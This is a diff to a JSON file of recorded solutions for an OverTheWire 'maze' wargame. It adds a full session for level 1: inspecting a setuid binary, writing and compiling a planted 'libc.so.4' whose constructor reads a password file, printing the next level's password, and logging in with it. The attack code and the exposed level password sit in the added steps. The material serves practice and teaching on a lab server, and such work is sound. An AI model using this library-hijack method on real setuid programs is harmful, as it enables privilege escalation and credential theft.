@@ -372,18 +372,353 @@
   },
   {
    "lvl": 1,
-   "pw": "jJF6jn9qW6",
    "user": "maze2",
+   "pw": "jJF6jn9qW6",
    "steps": [
     {
-     "cmd": "solve: plant libc.so.4 with a constructor (see tools/maze/l1/NOTES.md)",
+     "cmd": "ssh -o StrictHostKeyChecking=accept-new -o ServerAliveInterval=15 -o ServerAliveCountMax=4 -o HostKeyAlgorithms=+ssh-rsa,ssh-dss -o KexAlgorithms=+diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1 maze1@maze.labs.overthewire.org -p 2225",
      "out": [
-      "jJF6jn9qW6",
-      "Hello World!",
+      "maze1@maze.labs.overthewire.org's password: ",
+      "",
+      "      ,----..            ,----,          .---.",
+      "     /   /   \\         ,/   .`|         /. ./|",
+      "    /   .     :      ,`   .'  :     .--'.  ' ;",
+      "   .   /   ;.  \\   ;    ;     /    /__./ \\ : |",
+      "  .   ;   /  ` ; .'___,/    ,' .--'.  '   \\' .",
+      "  ;   |  ; \\ ; | |    :     | /___/ \\ |    ' '",
+      "  |   :  | ; | ' ;    |.';  ; ;   \\  \\;      :",
+      "  .   |  ' ' ' : `----'  |  |  \\   ;  `      |",
+      "  '   ;  \\; /  |     '   :  ;   .   \\    .\\  ;",
+      "   \\   \\  ',  /      |   |  '    \\   \\   ' \\ |",
+      "    ;   :    /       '   :  |     :   '  |--\"",
+      "     \\   \\ .'        ;   |.'       \\   \\ ;",
+      "  www. `---` ver     '---' he       '---\" ire.org",
+      "",
+      "",
+      "Welcome to OverTheWire!",
+      "",
+      "If you find any problems, please report them to the #wargames channel on",
+      "discord or IRC.",
+      "",
+      "--[ Playing the games ]--",
+      "",
+      "  This machine might hold several wargames.",
+      "  If you are playing \"somegame\", then:",
+      "",
+      "    * USERNAMES are somegame0, somegame1, ...",
+      "    * Most LEVELS are stored in /somegame/.",
+      "    * PASSWORDS for each level are stored in /etc/somegame_pass/.",
+      "",
+      "  Write-access to homedirectories is disabled. It is advised to create a",
+      "  working directory with a hard-to-guess name in /tmp/.  You can use the",
+      "  command \"mktemp -d\" in order to generate a random and hard to guess",
+      "  directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc",
+      "  restricted so that users cannot snoop on eachother. Files and directories",
+      "  with easily guessable or short names will be periodically deleted! The /tmp",
+      "  directory is regularly wiped.",
+      "  Please play nice:",
+      "",
+      "    * don't leave orphan processes running",
+      "    * don't leave exploit-files laying around",
+      "    * don't annoy other players",
+      "    * don't post passwords or spoilers",
+      "    * again, DONT POST SPOILERS!",
+      "      This includes writeups of your solution on your blog or website!",
+      "",
+      "--[ Tips ]--",
+      "",
+      "  This machine has a 64bit processor and many security-features enabled",
+      "  by default, although ASLR has been switched off.  The following",
+      "  compiler flags might be interesting:",
+      "",
+      "    -m32                    compile for 32bit",
+      "    -fno-stack-protector    disable ProPolice",
+      "    -Wl,-z,norelro          disable relro",
+      "",
+      "  In addition, the execstack tool can be used to flag the stack as",
+      "  executable on ELF binaries.",
+      "",
+      "  Finally, network-access is limited for most levels by a local",
+      "  firewall.",
+      "",
+      "--[ Tools ]--",
+      "",
+      " For your convenience we have installed a few useful tools which you can find",
+      " in the following locations:",
+      "",
+      "    * gef (https://github.com/hugsy/gef) in /opt/gef/",
+      "    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/",
+      "    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/",
+      "    * pwntools (https://github.com/Gallopsled/pwntools)",
+      "    * radare2 (http://www.radare.org/)",
+      "",
+      "--[ More information ]--",
+      "",
+      "  For more information regarding individual wargames, visit",
+      "  http://www.overthewire.org/wargames/",
+      "",
+      "  For support, questions or comments, contact us on discord or IRC.",
+      "",
+      "  Enjoy your stay!",
       ""
      ]
+    },
+    {
+     "cmd": "id",
+     "out": [
+      "uid=15001(maze1) gid=15001(maze1) groups=15001(maze1)"
+     ]
+    },
+    {
+     "cmd": "file /maze/maze1",
+     "out": [
+      "/maze/maze1: setuid ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=a66f455f03cf3c3e8f5c0fb95b1748ee707c4a92, for GNU/Linux 3.2.0, with debug_info, not stripped"
+     ]
+    },
+    {
+     "cmd": "readelf -d /maze/maze1 | grep NEEDED",
+     "out": [
+      " 0x00000001 (NEEDED)                     Shared library: [./libc.so.4]",
+      " 0x00000001 (NEEDED)                     Shared library: [libc.so.6]"
+     ]
+    },
+    {
+     "cmd": "objdump -d /maze/maze1 | sed -n '/<main>:/,/ret/p' | head -n 12",
+     "out": [
+      "08049166 <main>:",
+      " 8049166:\t55                   \tpush   %ebp",
+      " 8049167:\t89 e5                \tmov    %esp,%ebp",
+      " 8049169:\t68 08 a0 04 08       \tpush   $0x804a008",
+      " 804916e:\te8 cd fe ff ff       \tcall   8049040 <puts@plt>",
+      " 8049173:\t83 c4 04             \tadd    $0x4,%esp",
+      " 8049176:\tb8 00 00 00 00       \tmov    $0x0,%eax",
+      " 804917b:\tc9                   \tleave",
+      " 804917c:\tc3                   \tret"
+     ]
+    },
+    {
+     "cmd": "md5sum /maze/maze1",
+     "out": [
+      "b250dac8531a12793541b54f8a9993c8  /maze/maze1"
+     ]
+    },
+    {
+     "cmd": "cd /tmp; rm -rf l1exp; mkdir l1exp; chmod 755 l1exp; cd l1exp",
+     "out": []
+    },
+    {
+     "cmd": "vi lib4.c",
+     "out": [
+      "",
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi lib4.c",
+     "out": [
+      "#include <stdio.h>",
+      "#include <unistd.h>",
+      "/* libc.so.4 - the planted library: a constructor runs at load time",
+      "   (before main) with the setuid binary's fsuid (maze2), so it can",
+      "   read /etc/maze_pass/maze2 and print it. */",
+      "__attribute__((constructor))",
+      "static void init(void) {",
+      "    char b[256];",
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi lib4.c",
+     "out": [
+      "#include <stdio.h>",
+      "#include <unistd.h>",
+      "/* libc.so.4 - the planted library: a constructor runs at load time",
+      "   (before main) with the setuid binary's fsuid (maze2), so it can",
+      "   read /etc/maze_pass/maze2 and print it. */",
+      "__attribute__((constructor))",
+      "static void init(void) {",
+      "    char b[256];",
+      "    FILE *f = fopen(\"/etc/maze_pass/maze2\", \"r\");",
+      "    if (!f) return;",
+      "    size_t n = fread(b, 1, sizeof b - 1, f);",
+      "    fclose(f);",
+      "    b[n] = 0;",
+      "    write(1, b, n);",
+      "}",
+      "int _dummy;",
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi lib4.c",
+     "out": [
+      "#include <stdio.h>",
+      "#include <unistd.h>",
+      "/* libc.so.4 - the planted library: a constructor runs at load time",
+      "   (before main) with the setuid binary's fsuid (maze2), so it can",
+      "   read /etc/maze_pass/maze2 and print it. */",
+      "__attribute__((constructor))",
+      "static void init(void) {",
+      "    char b[256];",
+      "    FILE *f = fopen(\"/etc/maze_pass/maze2\", \"r\");",
+      "    if (!f) return;",
+      "    size_t n = fread(b, 1, sizeof b - 1, f);",
+      "    fclose(f);",
+      "    b[n] = 0;",
+      "    write(1, b, n);",
+      "}",
+      "int _dummy;",
+      "~",
+      "\"lib4.c\" [New] 17L, 479B written",
+      ""
+     ]
+    },
+    {
+     "cmd": "TMPDIR=/tmp/l1exp gcc -m32 -shared -fPIC -o libc.so.4 lib4.c && echo BUILT",
+     "out": [
+      "BUILT"
+     ]
+    },
+    {
+     "cmd": "ls -l libc.so.4",
+     "out": [
+      "-rwxrwxr-x 1 maze1 maze1 14768 Nov 26 16:54 libc.so.4"
+     ]
+    },
+    {
+     "cmd": "/maze/maze1",
+     "out": [
+      "jJF6jn9qW6",
+      "Hello World!"
+     ]
+    },
+    {
+     "cmd": "exit",
+     "out": [
+      "logout",
+      "Connection to maze.labs.overthewire.org closed."
+     ]
+    },
+    {
+     "cmd": "ssh -o StrictHostKeyChecking=accept-new -o PreferredAuthentications=password -o PubkeyAuthentication=no -p 2225 maze2@maze.labs.overthewire.org",
+     "out": [
+      "                                                    ",
+      "                            _ __ ___   __ _ _______ ",
+      "                           | '_ ` _ \\ / _` |_  / _ \\",
+      "                           | | | | | | (_| |/ /  __/",
+      "                           |_| |_| |_|\\__,_/___\\___|",
+      "                                                    ",
+      "",
+      "                      This is an OverTheWire game server. ",
+      "            More information on http://www.overthewire.org/wargames",
+      "",
+      "backend: gibson-0",
+      "maze2@maze.labs.overthewire.org's password: ",
+      "",
+      "      ,----..            ,----,          .---.",
+      "     /   /   \\         ,/   .`|         /. ./|",
+      "    /   .     :      ,`   .'  :     .--'.  ' ;",
+      "   .   /   ;.  \\   ;    ;     /    /__./ \\ : |",
+      "  .   ;   /  ` ; .'___,/    ,' .--'.  '   \\' .",
+      "  ;   |  ; \\ ; | |    :     | /___/ \\ |    ' '",
+      "  |   :  | ; | ' ;    |.';  ; ;   \\  \\;      :",
+      "  .   |  ' ' ' : `----'  |  |  \\   ;  `      |",
+      "  '   ;  \\; /  |     '   :  ;   .   \\    .\\  ;",
+      "   \\   \\  ',  /      |   |  '    \\   \\   ' \\ |",
+      "    ;   :    /       '   :  |     :   '  |--\"",
+      "     \\   \\ .'        ;   |.'       \\   \\ ;",
+      "  www. `---` ver     '---' he       '---\" ire.org",
+      "",
+      "",
+      "Welcome to OverTheWire!",
+      "",
+      "If you find any problems, please report them to the #wargames channel on",
+      "discord or IRC.",
+      "",
+      "--[ Playing the games ]--",
+      "",
+      "  This machine might hold several wargames.",
+      "  If you are playing \"somegame\", then:",
+      "",
+      "    * USERNAMES are somegame0, somegame1, ...",
+      "    * Most LEVELS are stored in /somegame/.",
+      "    * PASSWORDS for each level are stored in /etc/somegame_pass/.",
+      "",
+      "  Write-access to homedirectories is disabled. It is advised to create a",
+      "  working directory with a hard-to-guess name in /tmp/.  You can use the",
+      "  command \"mktemp -d\" in order to generate a random and hard to guess",
+      "  directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc",
+      "  restricted so that users cannot snoop on eachother. Files and directories",
+      "  with easily guessable or short names will be periodically deleted! The /tmp",
+      "  directory is regularly wiped.",
+      "  Please play nice:",
+      "",
+      "    * don't leave orphan processes running",
+      "    * don't leave exploit-files laying around",
+      "    * don't annoy other players",
+      "    * don't post passwords or spoilers",
+      "    * again, DONT POST SPOILERS!",
+      "      This includes writeups of your solution on your blog or website!",
+      "",
+      "--[ Tips ]--",
+      "",
+      "  This machine has a 64bit processor and many security-features enabled",
+      "  by default, although ASLR has been switched off.  The following",
+      "  compiler flags might be interesting:",
+      "",
+      "    -m32                    compile for 32bit",
+      "    -fno-stack-protector    disable ProPolice",
+      "    -Wl,-z,norelro          disable relro",
+      "",
+      "  In addition, the execstack tool can be used to flag the stack as",
+      "  executable on ELF binaries.",
+      "",
+      "  Finally, network-access is limited for most levels by a local",
+      "  firewall.",
+      "",
+      "--[ Tools ]--",
+      "",
+      " For your convenience we have installed a few useful tools which you can find",
+      " in the following locations:",
+      "",
+      "    * gef (https://github.com/hugsy/gef) in /opt/gef/",
+      "    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/",
+      "    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/",
+      "    * pwntools (https://github.com/Gallopsled/pwntools)",
+      "    * radare2 (http://www.radare.org/)",
+      "",
+      "--[ More information ]--",
+      "",
+      "  For more information regarding individual wargames, visit",
+      "  http://www.overthewire.org/wargames/",
+      "",
+      "  For support, questions or comments, contact us on discord or IRC.",
+      "",
+      "  Enjoy your stay!",
+      ""
+     ]
+    },
+    {
+     "cmd": "id",
+     "out": [
+      "uid=15002(maze2) gid=15002(maze2) groups=15002(maze2)"
+     ]
+    },
+    {
+     "cmd": "cat /etc/maze_pass/maze2",
+     "out": [
+      "jJF6jn9qW6"
+     ]
+    },
+    {
+     "cmd": "exit",
+     "out": [
+      "logout",
+      "Connection to maze.labs.overthewire.org closed."
+     ]
     }
-   ]
+   ],
+   "note": "DT_NEEDED './libc.so.4' (relative path) plant: /maze/maze1 (setuid maze2, 23-byte main = puts Hello World) loads the planted library BEFORE main; lib4.c (typed in vi) carries a __attribute__((constructor)) that runs with the setuid binary's fsuid (maze2) and prints /etc/maze_pass/maze2. Two loader gotchas measured live: the mktemp dir must be 755 (the loader opens libraries with fsuid maze2 - a 700 maze1-owned dir = Permission denied) and the plant must be a valid 32-bit ELF shared object. The cast solves live: constructor prints jJF6jn9qW6 then Hello World!, then a client-side maze2 login (uid=15002) cats the pass file to confirm. Cast: recordings/maze/L1.cast (standard v2 re-record 2026-11-26: typed ssh login, vi-only file write, replayable steps)."
   },
   {
    "lvl": 2,
